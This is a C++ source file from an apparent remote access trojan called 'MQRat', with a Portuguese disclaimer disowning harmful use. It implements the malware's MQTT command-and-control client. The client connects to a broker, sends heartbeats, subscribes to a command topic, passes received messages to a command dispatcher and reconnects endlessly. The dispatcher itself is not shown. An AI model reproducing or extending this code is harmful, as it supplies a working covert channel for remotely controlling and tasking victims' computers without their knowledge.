/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <iostream>
#include <string>
#include <thread>
#include "mqtt_client.hpp"
#include "utils.hpp"
#include "log.hpp"
#include "command_dispatcher.hpp"
#include "wrappers.hpp"

using namespace std;

MqttClient::MqttClient() {
	this->qos = 0;
    this->client = nullptr;
    this->broker_host = "127.0.0.1";
    this->reconnect_timeout = 5000;
}

MqttClient::MqttClient(unsigned qos_level, string broker_hostname) {
	this->qos = qos_level;
    this->client = nullptr;
    this->broker_host = broker_hostname;
    this->reconnect_timeout = 5000;
    dispatcher = new CommandDispatcher(nullptr, this);
}

bool MqttClient::Setup() {
	string client_id = Utils::GenerateID().c_str();

	Log::LogInfo("Setting up client to connect with: " + this->broker_host);
	Log::LogInfo("Client id: " + client_id);

    // Create MQTT client
    int status = MQTTClient_create(&client, this->broker_host.c_str(), client_id.c_str(), MQTTCLIENT_PERSISTENCE_NONE, NULL);
    if(status != MQTTCLIENT_SUCCESS) {
        Log::LogPanic("Failed to create MQTT client: " + to_string(status));
    }

    // Configure callbacks
    auto c = MQTTClient_setCallbacks(client, this, Wrappers::onLost, Wrappers::onMsgReceived, Wrappers::onDelivered);
    if(c != MQTTCLIENT_SUCCESS) {
        Log::LogPanic("Failed to setup callbacks: " + to_string(c));
    }

    return true;
}


void MqttClient::Subscribe(string topic) {
	int status;
	
	Log::LogInfo("Subscribing to topic: " + topic);
	if((status = MQTTClient_subscribe(client, topic.c_str(), this->qos)) != MQTTCLIENT_SUCCESS) {
		Log::LogPanic("Failed to subscribe: " + to_string(status));
	}
}

void MqttClient::ConfigureOptions(MQTTClient_connectOptions *options) {
        options->MQTTVersion = MQTTVERSION_3_1_1;
		options->connectTimeout = 10;
		options->cleansession = 0;
		//options->keepAliveInterval = 10;
}

void MqttClient::Connect() {
    MQTTClient_connectOptions options = MQTTClient_connectOptions_initializer;

    // Try connect with broker
    if(client != NULL) {
        this->ConfigureOptions(&options);
		auto connect_status = MQTTClient_connect(client, &options);
        if(connect_status != MQTTCLIENT_SUCCESS) {
            Log::LogPanic("Failed to connect with broker: " + to_string(connect_status));
        }

        // Sends the heartbeat
        SendHeartbeat();
		
		Log::LogInfo("Connected with " + broker_host);
    }
}

void MqttClient::Publish(string data, string topic) {
	MQTTClient_deliveryToken token;
	auto delivery_timeout = 5000UL;
	
	if(topic.empty()) {
		Log::LogError("Empty topic name passed to publish function");
		return;
	}
	
	// Publishes the message
	MQTTClient_publish(client, topic.c_str(), data.length(), 
                    reinterpret_cast<const void*>(data.c_str()), this->qos, 0, &token);
    
	// Wait for message delivery
	auto status = MQTTClient_waitForCompletion(client, token, delivery_timeout);	
    if(status != MQTTCLIENT_SUCCESS) {
        Log::LogError("Failed to publish data: " + status);
    }

	Log::LogInfo("Message published to topic " + topic);
}

void MqttClient::Loop() {
    while(true) {
		MQTTClient_yield();
        Sleep(this->reconnect_timeout);
    }
}

void MqttClient::Publish(vector<string> data, string topic)
{
    string payload = "";

    for(const auto& output : data) {
        payload += output + "\n";
    }

    this->Publish(payload, topic);
}

MQTTClient MqttClient::GetClient() {
    return client;
}

void MqttClient::OnConnectionLost(void *context, char *cause) {
    Log::LogError("Connection lost with broker. Reconnecting");
    Sleep(reconnect_timeout);
    this->Connect();
}

int MqttClient::OnMessageReceived(void *context, char *topic, int topic_len, MQTTClient_message *message) {
	
	Log::LogInfo("Message received on topic " + string(topic));

    // Dispatch received command
    dispatcher->setMessage(message);
    dispatcher->Dispatch();
	
	return 0;
}

void MqttClient::OnDelivered(void* context, MQTTClient_deliveryToken dt) {

}

void MqttClient::setSendTopic(std::string new_topic)
{
    this->send_topic = new_topic;
}

string MqttClient::getSendTopic()
{
    return this->send_topic;
}

void MqttClient::SendHeartbeat()
{
    this->Publish("/hb", getRecvTopic());
}

string MqttClient::getRecvTopic()
{
    return this->recv_topic;
}

void MqttClient::setRecvTopic(string new_topic)
{
    this->recv_topic = new_topic;
}